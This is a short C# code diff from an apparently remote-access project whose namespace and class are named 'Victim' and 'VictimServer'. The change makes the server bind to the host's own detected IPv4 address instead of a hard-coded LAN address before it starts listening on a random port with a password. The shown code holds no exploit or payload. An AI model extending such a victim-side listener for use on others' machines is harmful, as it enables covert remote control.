@@ -21,7 +21,16 @@ namespace Victim
             UdpClient uclient = new UdpClient(0);
             int random_port = ((IPEndPoint)uclient.Client.LocalEndPoint).Port;
             uclient.Close();
-            VictimServer vs = new VictimServer(random_port, pass, "192.168.1.6");
+            String this_ip="";
+            var host = Dns.GetHostEntry(Dns.GetHostName());
+            foreach (var ip in host.AddressList)
+            {
+                if (ip.AddressFamily == AddressFamily.InterNetwork)
+                {
+                    this_ip = ip.ToString();
+                }
+            }
+            VictimServer vs = new VictimServer(random_port, pass, this_ip);
             vs.serve();
         }
     }
